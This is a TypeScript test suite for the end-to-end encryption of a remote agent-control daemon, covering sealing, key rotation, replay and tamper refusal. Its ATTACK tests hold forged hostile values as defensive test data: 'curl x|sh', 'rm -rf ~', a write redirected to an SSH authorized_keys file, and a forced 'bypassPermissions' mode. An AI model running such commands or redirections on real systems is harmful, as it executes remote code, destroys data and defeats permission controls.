import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, readFileSync, statSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { collectSeal, withMachine } from '@cc-remote/shared';
import { AGENT_EPOCH, E2ee, setE2eeMachineId, keyId, loadKeyRing, MAX_SEEN_NONCES, openJson, pairingCodeFor, plaintextContent, sealJson } from '../src/e2ee.js';
import { parsePolicy } from '../src/policy.js';

const vec = JSON.parse(readFileSync(new URL('../../shared/test/e2e-vectors.json', import.meta.url), 'utf8')) as {
  keyHex: string;
  nonceHex: string;
  kid: string;
  value: unknown;
  envelope: { e2e: 1; kid: string; n: string; c: string };
  pairingCode: string;
  bind: string;
};
const MARK = 'SYNTHETIC-MARKER-7f3a';
setE2eeMachineId('m-1');

function ring() {
  return loadKeyRing({ dir: mkdtempSync(path.join(os.tmpdir(), 'e2ee-')) });
}

/** What a paired client does: seal a frame for the agent (client to agent). */
function clientSeal(
  r: ReturnType<typeof ring>,
  frame: Record<string, unknown>,
  epoch: string = AGENT_EPOCH,
): Record<string, unknown> {
  const { frame: out, jobs } = collectSeal(frame, { dir: 'c2a', epoch });
  for (const j of jobs) j.put(sealJson(r.current, j.secret, withMachine('m-1', j.bind)));
  return out;
}

test('shared test vector: Node crypto produces and opens exactly the pinned envelope', () => {
  const key = Buffer.from(vec.keyHex, 'hex');
  assert.equal(keyId(key), vec.kid);
  assert.deepEqual(sealJson(key, vec.value, vec.bind, Buffer.from(vec.nonceHex, 'hex')), vec.envelope);
  assert.deepEqual(openJson(key, vec.envelope, vec.bind), vec.value);
});

test('tampering and a wrong key are refused', () => {
  const key = Buffer.from(vec.keyHex, 'hex');
  const bad = { ...vec.envelope, kid: 'ffffffffffffffff' }; // AAD mismatch
  assert.throws(() => openJson(key, bad, vec.bind));
  assert.throws(() => openJson(Buffer.alloc(32, 7), vec.envelope, vec.bind));
  // The same bytes do not open for another frame or the other direction.
  assert.throws(() => openJson(key, vec.envelope, 'm-1|a2c|stream|run-2'));
  assert.throws(() => openJson(key, vec.envelope, 'm-1|c2a|stream|run-1'));
  // ...nor as another machine's.
  assert.throws(() => openJson(key, vec.envelope, 'm-2|a2c|stream|run-1'));
});

test('key file is 0600, stable across loads, and rotation retires the old key', () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), 'e2ee-'));
  const a = loadKeyRing({ dir });
  if (process.platform !== 'win32') assert.equal(statSync(path.join(dir, 'e2ee.key')).mode & 0o777, 0o600);
  assert.equal(loadKeyRing({ dir }).currentId, a.currentId);
  const b = loadKeyRing({ dir, rotate: true });
  assert.notEqual(b.currentId, a.currentId);
  assert.ok(b.byId.has(a.currentId), 'the retired key still opens old ciphertext');
  assert.ok(pairingCodeFor('m-1', b).startsWith('hcp1.m-1.'));
});

test('outgoing: content never appears in clear; incoming opens it again', () => {
  const e = new E2ee(ring());
  const stream = { type: 'stream', runId: 'r', sessionId: 's', event: { kind: 'assistant', text: MARK, data: { x: MARK } } };
  const out = e.sealOutgoing(stream)!;
  assert.ok(!JSON.stringify(out).includes(MARK));
  assert.equal((out['event'] as Record<string, unknown>)['kind'], 'assistant');
  // Agent-sealed content is not a command: it does not open in the client direction.
  assert.match(e.openIncoming(out).refusal ?? '', /could not decrypt/);

  const chunk = { type: 'session_sync_chunk', syncId: 'x', start: 0, messages: [{ type: 'user', uuid: 'u', blocks: [{ kind: 'text', text: MARK }], ts: 1 }] };
  const sealedChunk = e.sealOutgoing(chunk)!;
  assert.ok(!JSON.stringify(sealedChunk).includes(MARK));

  const summary = { type: 'inventory', sessions: [{ sessionId: 's', title: MARK, cwd: `/work/${MARK}`, project: MARK, lastModified: 1 }] };
  const inv = e.sealOutgoing(summary)!;
  assert.ok(!JSON.stringify(inv).includes(MARK));
  const s0 = (inv['sessions'] as Record<string, unknown>[])[0]!;
  assert.equal(s0['title'], 'Зашифровано');
  assert.deepEqual(e.openSummary(s0), summary.sessions[0]);
});

test('an unchanged summary seals to the same bytes (the hub skips unchanged rows); a changed one does not', () => {
  const e = new E2ee(ring());
  const inv = (title: string) => ({ type: 'inventory', sessions: [{ sessionId: 's', title, cwd: '/w/p', lastModified: 1 }] });
  const a = JSON.stringify(e.sealOutgoing(inv('one')));
  assert.equal(JSON.stringify(e.sealOutgoing(inv('one'))), a);
  assert.notEqual(JSON.stringify(e.sealOutgoing(inv('two'))), a);
  // Content frames never reuse a nonce.
  const f = () => JSON.stringify(e.sealOutgoing({ type: 'stream', runId: 'r', sessionId: 's', event: { kind: 'assistant', text: 'x' } }));
  assert.notEqual(f(), f());
});

test('rpc responses are sealed by the method they answer', () => {
  const e = new E2ee(ring());
  e.noteRpc('q1', 'fs.read');
  const r = e.sealOutgoing({ type: 'rpc_response', requestId: 'q1', ok: true, result: { path: 'a', content: MARK } })!;
  assert.ok(!JSON.stringify(r).includes(MARK));
  e.noteRpc('q2', 'models.list');
  const m = e.sealOutgoing({ type: 'rpc_response', requestId: 'q2', ok: true, result: { models: [] } })!;
  assert.deepEqual(m['result'], { models: [] });
});

test('rpc responses: an unknown method, a forgotten request and an error are all sealed', () => {
  const e = new E2ee(ring());
  e.noteRpc('q1', 'some.new.method');
  const a = e.sealOutgoing({ type: 'rpc_response', requestId: 'q1', ok: true, result: { x: MARK } })!;
  assert.ok(!JSON.stringify(a).includes(MARK));
  // No note at all (e.g. a refusal made before the request was noted).
  const b = e.sealOutgoing({ type: 'rpc_response', requestId: 'never', ok: true, result: { x: MARK } })!;
  assert.ok(!JSON.stringify(b).includes(MARK));
  const c = e.sealOutgoing({ type: 'rpc_response', requestId: 'q3', ok: false, error: `no such file ${MARK}` })!;
  assert.ok(!JSON.stringify(c).includes(MARK));
  assert.equal(c['error'], 'Зашифровано');
});

test('rpc bookkeeping: an entry is dropped when its response goes out; overflow refuses; a duplicate id is dropped', () => {
  const e = new E2ee(ring());
  for (let i = 0; i < 4096; i++) assert.equal(e.noteRpc(`q${i}`, 'fs.read'), 'ok');
  assert.equal(e.noteRpc('overflow', 'fs.read'), 'full');
  // An id still in flight is not rewritten by a second request.
  assert.equal(e.noteRpc('q1', 'models.list'), 'duplicate');
  e.sealOutgoing({ type: 'rpc_response', requestId: 'q0', ok: true, result: { ok: true } });
  assert.equal(e.noteRpc('overflow', 'fs.read'), 'ok');
});

test('frames that only leak metadata are not sent', () => {
  const e = new E2ee(ring());
  assert.equal(e.sealOutgoing({ type: 'memory_push', content: MARK }), null);
  assert.equal(e.sealOutgoing({ type: 'builder_profile', profile: {} }), null);
  assert.equal(e.sealOutgoing({ type: 'project_pushed', cwd: '/x', remoteHost: 'h' }), null);
  const c = e.sealOutgoing({ type: 'session_committed', sessionId: 's', cwd: '/x' })!;
  assert.equal(c['cwd'], undefined);
  const st = e.sealOutgoing({ type: 'machine_stats', stats: { cpuCount: 1, top: [{ name: MARK }] } })!;
  assert.deepEqual((st['stats'] as { top: unknown[] }).top, []);
});

test('a private machine refuses plaintext content and a foreign key', () => {
  const e = new E2ee(ring());
  assert.match(e.openIncoming({ type: 'input', runId: 'r', text: MARK }).refusal ?? '', /input must be encrypted/);
  assert.match(e.openIncoming({ type: 'new_session', runId: 'r', cwd: '/x', message: MARK }).refusal ?? '', /new_session/);
  assert.match(e.openIncoming({ type: 'rpc_request', requestId: 'q', method: 'fs.write', params: { content: MARK } }).refusal ?? '', /fs.write/);
  assert.match(e.openIncoming({ type: 'rpc_request', requestId: 'q', method: 'git.pr.create', params: { title: MARK } }).refusal ?? '', /git.pr.create/);
  assert.match(e.openIncoming({ type: 'resume', runId: 'r', sessionId: 's', cwd: '/x', message: MARK }).refusal ?? '', /resume/);
  assert.equal(e.openIncoming({ type: 'input', runId: 'r', text: MARK }, { acceptPlaintext: true }).refusal, undefined);
  // Nothing to say = nothing to refuse.
  assert.equal(e.openIncoming({ type: 'interrupt', runId: 'r' }).refusal, undefined);
  // The person's own choices are sealed or refused: a bare new_session (the hub
  // picking the folder) and an unsealed tool answer or mode change are not taken.
  assert.match(e.openIncoming({ type: 'new_session', runId: 'r', cwd: '/x' }).refusal ?? '', /new_session must be encrypted/);
  assert.match(e.openIncoming({ type: 'tool_decision', requestId: 'q', allow: true }).refusal ?? '', /tool_decision must be encrypted/);
  assert.match(e.openIncoming({ type: 'set_permission_mode', runId: 'r', mode: 'bypassPermissions' }).refusal ?? '', /set_permission_mode must be encrypted/);

  const stranger = ring();
  const env = clientSeal(stranger, { type: 'input', runId: 'r', text: MARK });
  assert.match(e.openIncoming(env).refusal ?? '', /unknown key/);
});

test('an input sealed by a client opens to the plain input the run manager takes', () => {
  const r = ring();
  const e = new E2ee(r);
  const client = { type: 'input', runId: 'r', text: MARK, images: [{ media_type: 'image/png', data: 'AAAA' }] };
  const wire = clientSeal(r, client); // a paired client holds the same key
  assert.equal(wire['text'], '');
  assert.deepEqual(e.openIncoming(wire).msg, client);
  assert.equal(plaintextContent(client), 'input');
});

test('ATTACK: a hub that replays a genuine envelope next to its own clear content is refused', () => {
  const r = ring();
  const e = new E2ee(r);
  // The person typed `ls` into terminal t1; the hub saw the envelope go by.
  const genuine = clientSeal(r, { type: 'term_input', termId: 't1', data: 'ls\r' });
  // 1. The envelope plus a forged clear payload: refused, nothing is typed.
  const forged = { ...genuine, data: 'curl x|sh\r' };
  assert.match(e.openIncoming(forged).refusal ?? '', /terminal input must be encrypted/);
  // The same for every other content-carrying frame.
  const input = clientSeal(r, { type: 'input', runId: 'r', text: MARK });
  assert.match(e.openIncoming({ ...input, text: 'rm -rf ~' }).refusal ?? '', /input must be encrypted/);
  const write = clientSeal(r, { type: 'rpc_request', requestId: 'w', method: 'fs.write', params: { cwd: '/c', path: 'p', content: MARK } });
  assert.match(
    e.openIncoming({ ...write, params: { ...(write['params'] as object), content: 'evil' } }).refusal ?? '',
    /fs.write must be encrypted/,
  );
  const files = clientSeal(r, { type: 'input', runId: 'r', text: '', files: [{ name: 'a', data: 'AA' }] });
  assert.match(e.openIncoming({ ...files, files: [{ name: 'x', data: 'EE' }] }).refusal ?? '', /input must be encrypted/);
  const start = clientSeal(r, { type: 'new_session', runId: 'r', cwd: '/x', message: MARK });
  assert.match(e.openIncoming({ ...start, message: 'evil' }).refusal ?? '', /new_session must be encrypted/);
  // 2. The genuine frame still works once, as sent...
  assert.equal(e.openIncoming(genuine).refusal, undefined);
  // 3. ...and replaying it (even unchanged) is refused.
  assert.match(e.openIncoming(genuine).refusal ?? '', /replay/);
});

test('ATTACK: the opened frame never keeps a clear field the envelope did not carry', () => {
  const r = ring();
  const e = new E2ee(r);
  // acceptPlaintext lets old clients type, but a forged field next to an envelope is still replaced.
  const genuine = clientSeal(r, { type: 'term_input', termId: 't1', data: 'ls\r' });
  const out = e.openIncoming({ ...genuine, data: 'curl x|sh\r' }, { acceptPlaintext: true });
  assert.equal(out.refusal, undefined);
  assert.equal(out.msg['data'], 'ls\r');
});

test('ATTACK: an envelope lifted onto another terminal, run, request or direction does not open', () => {
  const r = ring();
  const e = new E2ee(r);
  const genuine = clientSeal(r, { type: 'term_input', termId: 't1', data: 'ls\r' }) as { e2e: unknown };
  assert.match(e.openIncoming({ type: 'term_input', termId: 't2', data: '', e2e: genuine.e2e } as never).refusal ?? '', /could not decrypt/);
  assert.match(e.openIncoming({ type: 'input', runId: 't1', text: '', e2e: genuine.e2e } as never).refusal ?? '', /could not decrypt/);
  // An agent-made (a2c) envelope presented to the agent as a command.
  const out = e.sealOutgoing({ type: 'term_data', termId: 't1', data: MARK })!;
  assert.match(e.openIncoming({ type: 'term_input', termId: 't1', data: '', e2e: out['e2e'] } as never).refusal ?? '', /could not decrypt/);
  // The failed attempts did not burn the genuine envelope.
  assert.equal(e.openIncoming(genuine as never).refusal, undefined);
});

test('inbound nonce memory is bounded; past the cap sealed commands are refused', () => {
  const r = ring();
  const e = new E2ee(r);
  const seen = (e as unknown as { seenNonces: Set<string> }).seenNonces;
  for (let i = 0; i < MAX_SEEN_NONCES; i++) seen.add(`n${i}`);
  const wire = clientSeal(r, { type: 'term_input', termId: 't', data: 'ls' });
  assert.match(e.openIncoming(wire).refusal ?? '', /too many encrypted commands/);
  assert.equal(seen.size, MAX_SEEN_NONCES);
});

test('policy: private only for a literal true; anything else is reported and ignored', () => {
  assert.equal(parsePolicy({}).private, undefined);
  assert.equal(parsePolicy({ private: true }).private, true);
  assert.equal(parsePolicy({ private: false }).private, undefined);
  const err = console.error;
  const logged: string[] = [];
  console.error = (m: unknown) => void logged.push(String(m));
  try {
    for (const bad of ['yes', 'true', 1, null, {}, []]) assert.equal(parsePolicy({ private: bad }).private, undefined);
  } finally {
    console.error = err;
  }
  assert.equal(logged.length, 6);
  assert.match(logged[0]!, /"private" must be true or false/);
  assert.equal(parsePolicy({ private: true, acceptPlaintextInput: true }).acceptPlaintextInput, true);
  assert.equal(parsePolicy({ private: true }).acceptPlaintextInput, undefined);
});

test('a key rotated by another process (--pair --rotate) is picked up without a restart', () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), 'e2ee-'));
  const before = loadKeyRing({ dir });
  const e = new E2ee(before, dir);
  const oldClient = clientSeal(before, { type: 'term_input', termId: 't', data: 'one' });
  const rotated = loadKeyRing({ dir, rotate: true }); // the owner's other process
  assert.notEqual(rotated.currentId, before.currentId);
  // A device paired after the rotation: its kid is unknown to the daemon's old ring.
  const newClient = clientSeal(rotated, { type: 'term_input', termId: 't', data: 'two' });
  assert.equal(e.openIncoming(newClient).msg['data'], 'two');
  assert.equal(e.ring.currentId, rotated.currentId);
  // Output is sealed under the new key from now on; the old device's frame still opens.
  const out = e.sealOutgoing({ type: 'term_data', termId: 't', data: MARK })!;
  assert.equal((out['e2e'] as { kid: string }).kid, rotated.currentId);
  assert.equal(e.openIncoming(oldClient).msg['data'], 'one');
});

test('ATTACK: replay after an agent restart - a recording from another epoch does not open', () => {
  const r = ring();
  const e = new E2ee(r);
  const recorded = clientSeal(r, { type: 'term_input', termId: 't1', data: 'ls\r' }, 'epoch-of-the-previous-process');
  assert.match(e.openIncoming(recorded).refusal ?? '', /could not decrypt/);
  // Sealed for this process, it opens.
  assert.equal(e.openIncoming(clientSeal(r, { type: 'term_input', termId: 't1', data: 'ls\r' })).refusal, undefined);
});

test('ATTACK: the hub chooses the folder, the answer or the mode - the sealed values win and unsealed ones are refused', () => {
  const r = ring();
  const e = new E2ee(r);
  const ns = clientSeal(r, { type: 'new_session', runId: 'r', machineId: 'm', cwd: '/proj', model: 'sonnet', permissionMode: 'default', message: MARK });
  assert.equal(ns['cwd'], '/proj', 'the hub keeps the folder it routes by');
  const opened = e.openIncoming({ ...ns, cwd: '/etc', model: 'evil', permissionMode: 'bypassPermissions' }).msg;
  assert.equal(opened['cwd'], '/proj');
  assert.equal(opened['model'], 'sonnet');
  assert.equal(opened['permissionMode'], 'default');
  assert.equal(opened['message'], MARK);
  // A genuine input envelope offered as a new_session carries no folder.
  const input = clientSeal(r, { type: 'input', runId: 'r', text: MARK });
  assert.match(e.openIncoming({ type: 'new_session', runId: 'r2', cwd: '/etc', e2e: input['e2e'] } as never).refusal ?? '', /another kind|no sealed folder/);
  // tool answers: the allow is sealed.
  const td = clientSeal(r, { type: 'tool_decision', runId: 'r', requestId: 'q', allow: false, updatedInput: { a: 1 } });
  const dec = e.openIncoming({ ...td, allow: true }).msg;
  assert.equal(dec['allow'], false, 'the clear allow is a hint; the sealed one decides');
  assert.deepEqual(dec['updatedInput'], { a: 1 });
  const td2 = clientSeal(r, { type: 'tool_decision', runId: 'r', requestId: 'q2', allow: true });
  assert.match(e.openIncoming({ ...td2, updatedInput: { a: 'forged' } }).refusal ?? '', /tool_decision must be encrypted/);
  // The mode.
  const pm = clientSeal(r, { type: 'set_permission_mode', runId: 'r', mode: 'plan' });
  assert.equal(e.openIncoming({ ...pm, mode: 'bypassPermissions' }).msg['mode'], 'plan');
});

test('resume with a first message: an open sealed by the client reaches the agent as input, resume or takeover', () => {
  const r = ring();
  const attach = { type: 'open', machineId: 'm', sessionId: 'S', message: MARK, images: [{ media_type: 'image/png', data: 'AAAA' }] };
  // The hub turned the open into an input for a live run of session S.
  const asInput = new E2ee(r).openIncoming(
    { type: 'input', runId: 'run-1', text: '', e2e: clientSeal(r, attach)['e2e'] } as never,
    { sessionOfRun: (id) => (id === 'run-1' ? 'S' : undefined) },
  );
  assert.equal(asInput.refusal, undefined);
  assert.equal(asInput.msg['text'], MARK);
  assert.equal((asInput.msg['images'] as unknown[]).length, 1);
  // ...into a run of ANOTHER session: refused.
  assert.match(
    new E2ee(r).openIncoming(
      { type: 'input', runId: 'run-2', text: '', e2e: clientSeal(r, attach)['e2e'] } as never,
      { sessionOfRun: () => 'OTHER' },
    ).refusal ?? '',
    /another session/,
  );
  // As a takeover of S.
  const asTakeover = new E2ee(r).openIncoming({ type: 'takeover', runId: 'run-3', sessionId: 'S', cwd: '', e2e: clientSeal(r, attach)['e2e'] } as never);
  assert.equal(asTakeover.refusal, undefined);
  assert.equal(asTakeover.msg['message'], MARK);
});

test('a nonce that is not canonical 12-byte base64 is refused (re-spelling cannot dodge the replay set)', () => {
  const r = ring();
  const e = new E2ee(r);
  const wire = clientSeal(r, { type: 'term_input', termId: 't', data: 'ls' }) as { e2e: { n: string } };
  assert.equal(e.openIncoming(JSON.parse(JSON.stringify(wire))).refusal, undefined);
  // 12 bytes encode to 16 chars with no padding; a different spelling of the same bytes:
  const n = wire.e2e.n;
  const respelled = { ...wire, e2e: { ...wire.e2e, n: n.slice(0, -2) + 'A=' } };
  assert.match(e.openIncoming(respelled as never).refusal ?? '', /malformed nonce|could not decrypt|replay/);
  const short = { ...wire, e2e: { ...wire.e2e, n: Buffer.alloc(8).toString('base64') } };
  assert.match(e.openIncoming(short as never).refusal ?? '', /malformed nonce/);
  const padded = { ...wire, e2e: { ...wire.e2e, n: `${n}==` } };
  assert.match(e.openIncoming(padded as never).refusal ?? '', /malformed nonce/);
});

test('a machine that is no longer private still opens a paired browser\'s sealed commands (and never insists)', () => {
  const r = ring();
  const e = new E2ee(r);
  const wire = clientSeal(r, { type: 'input', runId: 'r', text: MARK });
  const out = e.openIncoming(wire, { acceptPlaintext: true });
  assert.equal(out.refusal, undefined);
  assert.equal(out.msg['text'], MARK);
  // A plain command from a browser without the key is simply accepted there.
  assert.equal(e.openIncoming({ type: 'input', runId: 'r', text: 'hi' }, { acceptPlaintext: true }).refusal, undefined);
  assert.equal(e.openIncoming({ type: 'new_session', runId: 'r', cwd: '/x' }, { acceptPlaintext: true }).refusal, undefined);
});

test('ATTACK: a sealed fs.write whose clear path, folder or method the hub rewrote is refused', () => {
  const r = ring();
  const sealed = () =>
    clientSeal(r, { type: 'rpc_request', requestId: `w${Math.random()}`, machineId: 'm', method: 'fs.write', params: { cwd: '/c', path: 'notes.txt', content: MARK } }) as {
      method: string;
      params: Record<string, unknown>;
    };
  const e = new E2ee(r);
  const ok = sealed();
  assert.equal(e.openIncoming(ok).msg['params'] && (e.openIncoming(sealed()).msg['params'] as Record<string, unknown>)['content'], MARK);
  const a = sealed();
  assert.match(e.openIncoming({ ...a, params: { ...a.params, path: '/home/x/.ssh/authorized_keys' } }).refusal ?? '', /another path/);
  const b = sealed();
  assert.match(e.openIncoming({ ...b, params: { ...b.params, cwd: '/' } }).refusal ?? '', /another cwd/);
  const c = sealed();
  assert.match(e.openIncoming({ ...c, method: 'fs.upload.chunk' }).refusal ?? '', /another method|could not decrypt/);
});

test('an envelope of another machine does not open here', () => {
  const r = ring();
  const wire = clientSeal(r, { type: 'term_input', termId: 't', data: 'ls' });
  setE2eeMachineId('m-other');
  try {
    assert.match(new E2ee(r).openIncoming(wire).refusal ?? '', /could not decrypt/);
  } finally {
    setE2eeMachineId('m-1');
  }
  assert.equal(new E2ee(r).openIncoming(clientSeal(r, { type: 'term_input', termId: 't', data: 'ls' })).refusal, undefined);
});

test('a corrupt key file does not stop an ordinary machine (opener is null) and a private one still seals', async () => {
  const { writeFileSync } = await import('node:fs');
  const { e2ee, e2eeOpener, setE2eeForTests } = await import('../src/e2ee.js');
  const { setPolicyForTests } = await import('../src/policy.js');
  const dir = mkdtempSync(path.join(os.tmpdir(), 'e2ee-bad-'));
  const before = process.env['CC_REMOTE_STATE_DIR'];
  process.env['CC_REMOTE_STATE_DIR'] = dir;
  writeFileSync(path.join(dir, 'e2ee.key'), 'not a key');
  const err = console.error;
  console.error = () => {};
  try {
    setE2eeForTests(undefined);
    setPolicyForTests({ chatOnly: false, sync: 'all' });
    assert.equal(e2eeOpener(), null);
    setE2eeForTests(undefined);
    setPolicyForTests({ chatOnly: false, sync: 'all', private: true });
    const e = e2ee();
    assert.ok(e, 'a private machine with a damaged key still gets an encryption (throwaway key)');
    const out = e!.sealOutgoing({ type: 'term_data', termId: 't', data: MARK })!;
    assert.ok(!JSON.stringify(out).includes(MARK));
    assert.match(e!.openIncoming(clientSeal(ring(), { type: 'term_input', termId: 't', data: 'x' })).refusal ?? '', /unknown key/);
  } finally {
    console.error = err;
    if (before === undefined) delete process.env['CC_REMOTE_STATE_DIR'];
    else process.env['CC_REMOTE_STATE_DIR'] = before;
    setE2eeForTests(undefined);
    setPolicyForTests(undefined);
  }
});
